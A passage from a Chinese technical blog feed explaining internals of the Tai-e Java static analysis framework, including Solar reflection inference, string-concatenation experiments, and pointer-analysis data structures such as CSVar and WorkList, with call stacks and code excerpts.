class="literal">null</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123; <span class="comment">// index is not constant, give up</span></span><br><span class="line">                            argTypes = <span class="literal">null</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (argTypes != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// fill NullType for non-assigned array indexes</span></span><br><span class="line">            <span class="comment">// 如果argTypes还有没找到类型的，就设置为NullType</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; ++i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (argTypes[i] == <span class="literal">null</span>) &#123;</span><br><span class="line">                        argTypes[i] = NullType.NULL;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;Type&gt; argumentTypes = (argTypes != <span class="literal">null</span>) ? List.of(argTypes) : <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 最后由组成returnType，argsType TypeInfo</span></span><br><span class="line">    <span class="keyword">return</span> (returnType == <span class="literal">null</span> &amp;&amp; argumentTypes == <span class="literal">null</span>)</span><br><span class="line">            ? UNKNOWN : <span class="keyword">new</span> <span class="title class_">TypeInfo</span>(returnType, argumentTypes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-733.png" alt="upload successful"><br><img src="/images/pasted-734.png" alt="upload successful"><br><img src="/images/pasted-735.png" alt="upload successful"></p><p>并未看到</p><p>通过对SolarModel的分析，我们并未发现对invoke 方法的推断逻辑</p><p>调试发现，这个关系在worlList的callEdges中</p><p>WorkList#addEntry 方法提供对callEdges的增加操作，其有一处usage</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DefaultSlover#processCall</span><br><span class="line">ReflectiveActionModel#addReflectiveCallEdge</span><br><span class="line">...</span><br><span class="line">    DefaultSlover#addCallEdge</span><br><span class="line">        WorkList#addEntry</span><br><span class="line">            WorkList.callEdges.add</span><br></pre></td></tr></table></figure><h2 id="5-2-SolarModel-methodInvoke-第二次"><a href="#5-2-SolarModel-methodInvoke-第二次" class="headerlink" title="5.2 SolarModel#methodInvoke 第二次"></a>5.2 SolarModel#methodInvoke 第二次</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">methodInvoke:199, SolarModel (pascal.taie.analysis.pta.plugin.reflection)</span><br><span class="line">accept:-1, AbstractModel$$Lambda$289/0x0000000800ed8ac8 (pascal.taie.analysis.pta.plugin.util)</span><br><span class="line">lambda$handleNewPointsToSet$0:155, AbstractModel (pascal.taie.analysis.pta.plugin.util)</span><br><span class="line">accept:-1, AbstractModel$$Lambda$359/0x0000000800f0d368 (pascal.taie.analysis.pta.plugin.util)</span><br><span class="line">forEach:75, Iterable (java.lang)</span><br><span class="line">forEach:1092, Collections$UnmodifiableCollection (java.util)</span><br><span class="line">handleNewPointsToSet:151, AbstractModel (pascal.taie.analysis.pta.plugin.util)</span><br><span class="line">handleNewPointsToSet:292, SolarModel (pascal.taie.analysis.pta.plugin.reflection)</span><br><span class="line">onNewPointsToSet:126, ReflectionAnalysis (pascal.taie.analysis.pta.plugin.reflection)</span><br><span class="line">lambda$onNewPointsToSet$1:109, CompositePlugin (pascal.taie.analysis.pta.plugin)</span><br><span class="line">accept:-1, CompositePlugin$$Lambda$354/0x0000000800f0c418 (pascal.taie.analysis.pta.plugin)</span><br><span class="line">forEach:1511, ArrayList (java.util)</span><br><span class="line">onNewPointsToSet:109, CompositePlugin (pascal.taie.analysis.pta.plugin)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-736.png" alt="upload successful"></p><p>此刻mtdObjs 已经有值了，并且是关联上了正确的pts：echo method</p><p>中间发生了啥？</p><h2 id="5-3-SolarModel-getMethod"><a href="#5-3-SolarModel-getMethod" class="headerlink" title="5.3 SolarModel#getMethod"></a>5.3 SolarModel#getMethod</h2><p>在处理getMethod时，如果发现method可以被定位，那么会调用classGetMethodKnown，进而还会把result重新入栈workList进行计算<br>注意此时的result 为method<br>对应的是invoke 的method，重新入栈之后会再次触发SolarModel#invoke，而这次method 的pts已经是已知的了。</p><p><img src="/images/pasted-737.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:<span class="number">49</span>, MockObj (pascal.taie.analysis.pta.core.heap)</span><br><span class="line">getMockObj:<span class="number">207</span>, AbstractHeapModel (pascal.taie.analysis.pta.core.heap)</span><br><span class="line">getMockObj:<span class="number">63</span>, HeapModel (pascal.taie.analysis.pta.core.heap)</span><br><span class="line">getMockObj:<span class="number">77</span>, HeapModel (pascal.taie.analysis.pta.core.heap)</span><br><span class="line">getMetaObj:<span class="number">131</span>, MetaObjHelper (pascal.taie.analysis.pta.plugin.reflection)</span><br><span class="line">getMetaObj:<span class="number">105</span>, MetaObjHelper (pascal.taie.analysis.pta.plugin.reflection)</span><br><span class="line">apply:-<span class="number">1</span>, InferenceModel$$Lambda$<span class="number">367</span>/<span class="number">0x0000000800f0eac0</span> (pascal.taie.analysis.pta.plugin.reflection)</span><br><span class="line">accept:<span class="number">197</span>, ReferencePipeline$<span class="number">3</span>$<span class="number">1</span> (java.util.stream)</span><br><span class="line">forEachRemaining:<span class="number">1625</span>, ArrayList$ArrayListSpliterator (java.util)</span><br><span class="line">copyInto:<span class="number">509</span>, AbstractPipeline (java.util.stream)</span><br><span class="line">wrapAndCopyInto:<span class="number">499</span>, AbstractPipeline (java.util.stream)</span><br><span class="line">evaluateSequential:<span class="number">150</span>, ForEachOps$ForEachOp (java.util.stream)</span><br><span class="line">evaluateSequential:<span class="number">173</span>, ForEachOps$ForEachOp$OfRef (java.util.stream)</span><br><span class="line">evaluate:<span class="number">234</span>, AbstractPipeline (java.util.stream)</span><br><span class="line">forEach:<span class="number">596</span>, ReferencePipeline (java.util.stream)</span><br><span class="line">classGetMethodKnown:<span class="number">114</span>, InferenceModel (pascal.taie.analysis.pta.plugin.reflection)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-808.png" alt="upload successful"></p><p>workList 中新增一条记录，invoke调用的返回Var$r6，Obj为该invoke调用<br><img src="/images/pasted-809.png" alt="upload successful"></p><h1 id="0x06-其他探索"><a href="#0x06-其他探索" class="headerlink" title="0x06 其他探索"></a>0x06 其他探索</h1><h2 id="6-1-编译优化"><a href="#6-1-编译优化" class="headerlink" title="6.1 编译优化"></a>6.1 编译优化</h2><p>代码改成<code>&quot;ec&quot;+&quot;ho&quot;</code>表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 测试污点为参数</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> tt.getClass().getMethod(<span class="string">&quot;ec&quot;</span>+<span class="string">&quot;ho&quot;</span>, String.class);</span><br><span class="line">method.invoke(tt, content);</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-795.png" alt="upload successful"></p><p>发现IR中仍然会将其拼接成”echo”，这步是在哪实现的呢？</p><ul><li>编译阶段</li><li>IR</li></ul><p>答案是编译的时候进行了优化</p><p><img src="/images/pasted-796.png" alt="upload successful"></p><h2 id="6-2"><a href="#6-2" class="headerlink" title="6.2"></a>6.2</h2><p>拆分为变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">t</span> <span class="operator">=</span> <span class="string">&quot;ec&quot;</span>;</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> tt.getClass().getMethod(t+<span class="string">&quot;ho&quot;</span>, String.class);</span><br><span class="line">method.invoke(tt, content);</span><br></pre></td></tr></table></figure><p>此刻编译结果没有优化<br><img src="/images/pasted-797.png" alt="upload successful"></p><p>IR:</p><p><img src="/images/pasted-806.png" alt="upload successful"></p><p>看看Tai-e Solar反射分析结果<br><img src="/images/pasted-798.png" alt="upload successful"></p><p>结论：未被识别出来</p><h2 id="6-3"><a href="#6-3" class="headerlink" title="6.3"></a>6.3</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">t</span> <span class="operator">=</span> <span class="string">&quot;ho&quot;</span>;</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> tt.getClass().getMethod(<span class="string">&quot;ec&quot;</span>+t, String.class);</span><br><span class="line">method.invoke(tt, content);</span><br></pre></td></tr></table></figure><p>此刻编译结果没有优化<br><img src="/images/pasted-799.png" alt="upload successful"></p><p>IR:<br><img src="/images/pasted-801.png" alt="upload successful"></p><p>看看Tai-e Solar反射分析结果<br><img src="/images/pasted-802.png" alt="upload successful"></p><p>结论：未被识别出来</p><h2 id="6-4"><a href="#6-4" class="headerlink" title="6.4"></a>6.4</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">t</span> <span class="operator">=</span> <span class="string">&quot;echo&quot;</span>;</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> tt.getClass().getMethod(t, String.class);</span><br><span class="line">method.invoke(tt, content);</span><br></pre></td></tr></table></figure><p>此刻编译结果没有优化<br><img src="/images/pasted-803.png" alt="upload successful"></p><p>IR:<br><img src="/images/pasted-804.png" alt="upload successful"></p><p>看看Tai-e Solar反射分析结果<br><img src="/images/pasted-805.png" alt="upload successful"><br>结论：可以被识别</p><h1 id="0x07-总结与思考"><a href="#0x07-总结与思考" class="headerlink" title="0x07 总结与思考"></a>0x07 总结与思考</h1><ol><li>指针分析需要知道入口点，如何能够保证全部类文件都分析到？</li></ol><h1 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h1><ul><li>[1] <a href="https://github.com/pascal-lab/Tai-e">pascal-lab/Tai-e</a></li><li>[2] <a href="https://static-analysis.cuijiacai.com/">静态分析-基于南京大学软件分析课程的静态分析基础教程</a></li><li>[3] <a href="https://y4er.com/posts/simple-use-of-the-java-static-analysis-framework-tai-e/">Java静态分析框架Tai-e的简单使用</a></li><li>[4] <a href="https://cs.nju.edu.cn/yueli/papers/crad2023.pdf">Java 指针分析综述</a></li><li>[5] <a href="https://dl.acm.org/doi/pdf/10.1145/3295739">Understanding and Analyzing Java Reflection</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h1&gt;&lt;p&gt;如谭老师参考【4】中的《Java指针分析综述》一文中对于Java反射的静态分析研究简述：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Livshits 借助指针分析解析反射关键API的字符串参数进而分析出反射调用的副作用，简称字符串分析方法。&lt;/li&gt;
&lt;li&gt;谭、李老师提出的Elf 方案，思路大致是不依赖调用参数必须是字符串常量，而是根据其他信息，比如反射调用的参数类型、返回值的向下类型转换等。&lt;/li&gt;
&lt;li&gt;还是谭、李老师推出的Solar 方案，不是很懂，原文复述下&lt;ul&gt;
&lt;li&gt;集体推导技术(collective inference)&lt;/li&gt;
&lt;li&gt;懒惰堆建模(lazy heap modeling)， 懒惰堆建模用于分析由反射调用Class.newInstance()或 Constructor.newInstance()创建但具体类型在创建点未知的堆对象。对于这类对象，Solar 将其传播到程序中使用它们的位置，如向下类型转换，或Method.invoke()、Field.get()、Field.set()的反射调用点等，并更充分地利用程序中这些位置的类型信息以分析反射创建对象的具体类型。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;0x02-Tai-e-Solar&quot;&gt;&lt;a href=&quot;#0x02-Tai-e-Solar&quot; class=&quot;headerlink&quot; title=&quot;0x02 Tai-e Solar&quot;&gt;&lt;/a&gt;0x02 Tai-e Solar&lt;/h1&gt;&lt;h2 id=&quot;2-1-Invoke-Demo-Code&quot;&gt;&lt;a href=&quot;#2-1-Invoke-Demo-Code&quot; class=&quot;headerlink&quot; title=&quot;2.1 Invoke Demo Code&quot;&gt;&lt;/a&gt;2.1 Invoke Demo Code&lt;/h2&gt;&lt;p&gt;先准备待测试程序InvokeDemo&lt;/p&gt;</summary>
    
    
    
    <category term="静态分析" scheme="http://m0d9.me/categories/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Tai-e" scheme="http://m0d9.me/tags/Tai-e/"/>
    
  </entry>
  
  <entry>
    <title>Tai-e 指针分析PTA初探</title>
    <link href="http://m0d9.me/2023/10/09/Tai-e-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/"/>
    <id>http://m0d9.me/2023/10/09/Tai-e-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/</id>
    <published>2023-10-09T07:06:00.000Z</published>
    <updated>2025-06-11T11:49:46.391Z</updated>
    
    <content type="html"><![CDATA[<p>了解了IR，再来了解下最常用的PTA 指针分析是如何实现的。</p><h1 id="0x01-指针分析PTA原理"><a href="#0x01-指针分析PTA原理" class="headerlink" title="0x01 指针分析PTA原理"></a>0x01 指针分析PTA原理</h1><h2 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1 定义"></a>1.1 定义</h2><p><img src="/images/pasted-767.png" alt="upload successful"></p><blockquote><p>我们将分析一个指针可能指向的内存区域（Memory Location），以程序（Program）为输入，以程序中的指向关系（Point-to Relation）为输出的分析称作指针分析（Pointer Analysis）。</p></blockquote><p>这里先看简单的上下文不敏感的分析，举例说明</p><p>有个程序，求解运行foo()之后的变量/字段指向关系</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    B b;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setB</span><span class="params">(B b)</span> &#123; <span class="built_in">this</span>.b = b; &#125;</span><br><span class="line">    B <span class="title function_">getB</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.b; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">    <span class="type">B</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">    a.setB(x);</span><br><span class="line">    <span class="type">B</span> <span class="variable">y</span> <span class="operator">=</span> a.getB();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="/images/pasted-768.png" alt="upload successful"></p><p>注：</p><ul><li>此处是上下文不敏感分析</li></ul><h2 id="1-2-指针分析的关键因素"><a href="#1-2-指针分析的关键因素" class="headerlink" title="1.2 指针分析的关键因素"></a>1.2 指针分析的关键因素</h2><p><img src="/images/pasted-769.png" alt="upload successful"></p><p>这里仅做提及，后续再详细分析。</p><h2 id="1-3-上下文敏感的指针分析算法"><a href="#1-3-上下文敏感的指针分析算法" class="headerlink" title="1.3 上下文敏感的指针分析算法"></a>1.3 上下文敏感的指针分析算法</h2><p><img src="/images/pasted-770.png" alt="upload successful"></p><p>指针分析这块原理很多，只是捡了几个重点的贴出来，强烈建议去看两位老师的课件。</p><h1 id="0x02-Tai-e-IR"><a href="#0x02-Tai-e-IR" class="headerlink" title="0x02 Tai-e IR"></a>0x02 Tai-e IR</h1><p>在前面一文《Tai-e 分析之IR》中，我们跟踪了Tai-e 是如何利用Soot，再通过Transfrom和各种Converter build Tai-e自己的IR。</p><p>IR是整个PTA分析的前提。</p><p>这里单独讲讲几个重要的基础IR。</p><h2 id="2-1-Var-IR"><a href="#2-1-Var-IR" class="headerlink" title="2.1 Var IR"></a>2.1 Var IR</h2><p>Tai-e的Var IR也有些特殊，在Var初始化的时候，会生成相关的Var属性</p><ul><li>method: 所属method</li><li>name</li><li>type</li><li>index</li><li>constValue</li><li>relevantStmts: 存储该Var相关的特殊stmts<ul><li>loadFields</li><li>storeFields</li><li>loadArrays</li><li>storeArrays</li><li>invokes<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* Relevant statements of a variable, say v, which include:</span><br><span class="line">* load field: x = v.f;</span><br><span class="line">* store field: v.f = x;</span><br><span class="line">* load array: x = v[i];</span><br><span class="line">* store array: v[i] = x;</span><br><span class="line">* invocation: v.f();</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>其中的relevantStmts是该Var相关的一些特殊Stmt，方便后续的程序分析。</p><p>居然是在这一步做的。</p><p>在后续的分析中，会获取Var相关Field，比如StoreFiled的逻辑：</p><p>Var</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;StoreField&gt; <span class="title function_">getStoreFields</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> relevantStmts.getStoreFields();</span><br><span class="line">&#125;</span><br><span class="line">Var$RelevantStmts</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;StoreField&gt; <span class="title function_">getStoreFields</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> unmodifiable(storeFields);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点讲解下Var$RelevantStmts内部类。</p><p><img src="/images/pasted-771.png" alt="upload successful"></p><blockquote><p>疑问：relevantStmts是IR的时候就已经关联上了，还是在后续分析的时候关联上的?</p></blockquote><p>答案是IR build的时候，其构建过程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">addStoreField:172, Var (pascal.taie.ir.exp)</span><br><span class="line">&lt;init&gt;:42, StoreField (pascal.taie.ir.stmt)</span><br><span class="line">caseAssignStmt:605, MethodIRBuilder (pascal.taie.frontend.soot)</span><br><span class="line">apply:217, JAssignStmt (soot.jimple.internal)</span><br><span class="line">lambda$buildStmts$1:251, MethodIRBuilder (pascal.taie.frontend.soot)</span><br><span class="line">accept:-1, MethodIRBuilder$$Lambda$244/0x0000000800ebcf78 (pascal.taie.frontend.soot)</span><br><span class="line">forEach:75, Iterable (java.lang)</span><br><span class="line">buildStmts:251, MethodIRBuilder (pascal.taie.frontend.soot)</span><br><span class="line">build:226, MethodIRBuilder (pascal.taie.frontend.soot)</span><br><span class="line">buildIR:53, IRBuilder (pascal.taie.frontend.soot)</span><br><span class="line">getIR:192, JMethod (pascal.taie.language.classes)</span><br><span class="line">addEntryPoint:788, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">onStart:65, EntryPointHandler (pascal.taie.analysis.pta.plugin)</span><br><span class="line">accept:-1, CompositePlugin$$Lambda$311/0x0000000800ef0820 (pascal.taie.analysis.pta.plugin)</span><br><span class="line">forEach:1511, ArrayList (java.util)</span><br><span class="line">onStart:99, CompositePlugin (pascal.taie.analysis.pta.plugin)</span><br><span class="line">initialize:265, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">solve:245, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">runAnalysis:119, PointerAnalysis (pascal.taie.analysis.pta)</span><br><span class="line">analyze:107, PointerAnalysis (pascal.taie.analysis.pta)</span><br><span class="line">analyze:64, PointerAnalysis (pascal.taie.analysis.pta)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-772.png" alt="upload successful"><br>此刻unit为Soot的JAssignStmt，其apply会调用caseAssignStmt 接口</p><p><img src="/images/pasted-773.png" alt="upload successful"><br>lhs属于FieldRef，因此最终会将storeField stm添加在该Var IR的relevantStmts属性中。</p><h1 id="0x03-PTA-数据结构"><a href="#0x03-PTA-数据结构" class="headerlink" title="0x03 PTA 数据结构"></a>0x03 PTA 数据结构</h1><h2 id="3-1-CSVar"><a href="#3-1-CSVar" class="headerlink" title="3.1 CSVar"></a>3.1 CSVar</h2><p>CSVar 可以简单理解成PTA分析结果“指向关系图”中的变量/属性。<br>它是上下文敏感的Var，其中Var是Tai-e IR概念，其有以下字段</p><ul><li>var: 对应的IR Var</li><li>context: 上下文</li><li>pointToSet: 指向的值的集合</li><li>index</li><li>successors</li><li>outEdges</li><li>filters<br><img src="/images/pasted-774.png" alt="upload successful"></li></ul><p>如上图，其中红框中的n1\n2等，就是CSVar。</p><p>在后文的重要结构workList。pointerEntries中，其key就大部分是CSVar</p><p><img src="/images/pasted-775.png" alt="upload successful"></p><h2 id="3-2-PointToSet"><a href="#3-2-PointToSet" class="headerlink" title="3.2 PointToSet"></a>3.2 PointToSet</h2><p>PointToSet 是CSVar的可能值集合。CSVar中自带也有pointToSet属性。</p><p>它的Set的值是CSObj类型（堆敏感值，后续上下文敏感分析再细讲）。</p><p><img src="/images/pasted-776.png" alt="upload successful"><br>同样的，如上图，其中”{}”大括号内的就是PointToSet，比如o1、o2。</p><h2 id="3-3-WorkList"><a href="#3-3-WorkList" class="headerlink" title="3.3 WorkList"></a>3.3 WorkList</h2><p>WorkList 是在DefaultSolver中的重要变量，是整个指针分析的核心。</p><p>它内部存在着待分析的pointerEntries和callEdges，整个指针分析的核心逻辑就是从WorkList队列中出取值，进行处理，处理期间也可能会对WorkList进行入队列，直至WorkList 为空，停止分析。</p><h3 id="3-3-1-pointerEntries"><a href="#3-3-1-pointerEntries" class="headerlink" title="3.3.1 pointerEntries"></a>3.3.1 pointerEntries</h3><p>pointEntry 通常由一组（CSVar、PointToSet）组成，其入队列的api为</p><p>DefaultSolve#addPointsTo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addPointsTo</span><span class="params">(Pointer pointer, PointsToSet pts)</span> &#123;</span><br><span class="line">    workList.addEntry(pointer, pts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-2-callEdges"><a href="#3-3-2-callEdges" class="headerlink" title="3.3.2 callEdges"></a>3.3.2 callEdges</h3><p>在队列中具有高优先级，优先处理这一类元素。</p><p>同样的，其api为DefaultSolve#addCallEdge</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCallEdge</span><span class="params">(Edge&lt;CSCallSite, CSMethod&gt; edge)</span> &#123;</span><br><span class="line">    workList.addEntry(edge);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x04-PTA流程跟踪"><a href="#0x04-PTA流程跟踪" class="headerlink" title="0x04 PTA流程跟踪"></a>0x04 PTA流程跟踪</h1><p>PTA分析包装在PointerAnalysis（在pascal.taie.analysis.pta）， 我们从这里开始跟踪。</p><h2 id="4-1-AnalysisManager"><a href="#4-1-AnalysisManager" class="headerlink" title="4.1 AnalysisManager"></a>4.1 AnalysisManager</h2><p>在进入PointerAnalysis 之前，还由AnalysisManager包了一层。我们在前文《Tai-e 初探》 中有提到Tai-e 有很多程序分析功能，PTA只是其中一个。</p><p>AnalysisManager 就是这一层的封装，对应的调用栈如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">analyze:64, PointerAnalysis (pascal.taie.analysis.pta)</span><br><span class="line">runProgramAnalysis:148, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">runAnalysis:135, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">lambda$execute$0:104, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">get:-1, AnalysisManager$$Lambda$227/0x0000000800ea3010 (pascal.taie.analysis)</span><br><span class="line">runAndCount:93, Timer (pascal.taie.util)</span><br><span class="line">lambda$execute$1:103, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">accept:-1, AnalysisManager$$Lambda$226/0x0000000800ea2bb8 (pascal.taie.analysis)</span><br><span class="line">forEach:1511, ArrayList (java.util)</span><br><span class="line">execute:102, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">executePlan:152, Main (pascal.taie)</span><br><span class="line">lambda$main$0:61, Main (pascal.taie)</span><br><span class="line">run:-1, Main$$Lambda$109/0x0000000800d2b000 (pascal.taie)</span><br><span class="line">lambda$runAndCount$0:112, Timer (pascal.taie.util)</span><br><span class="line">get:-1, Timer$$Lambda$110/0x0000000800d2b458 (pascal.taie.util)</span><br><span class="line">runAndCount:93, Timer (pascal.taie.util)</span><br><span class="line">runAndCount:111, Timer (pascal.taie.util)</span><br><span class="line">runAndCount:107, Timer (pascal.taie.util)</span><br><span class="line">main:52, Main (pascal.taie)</span><br></pre></td></tr></table></figure><h2 id="4-2-PointerAnalysis"><a href="#4-2-PointerAnalysis" class="headerlink" title="4.2 PointerAnalysis"></a>4.2 PointerAnalysis</h2><p>实际上PointerAnalysis 也只是一层包装，具体逻辑是在solver和plugin中实现的。</p><p>这里有几个变量涉及到前文中几个重要的概念</p><p>heapModel：堆模型，负责指针分析中的“值”处理，用以区分它们的上下文<br>selector：上下文选择器，用于区分“变量”的上下文<br>这两个都后续再深入研究探讨，这里简单介绍下它们的功能，了解接口即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PointerAnalysisResult <span class="title function_">analyze</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">AnalysisOptions</span> <span 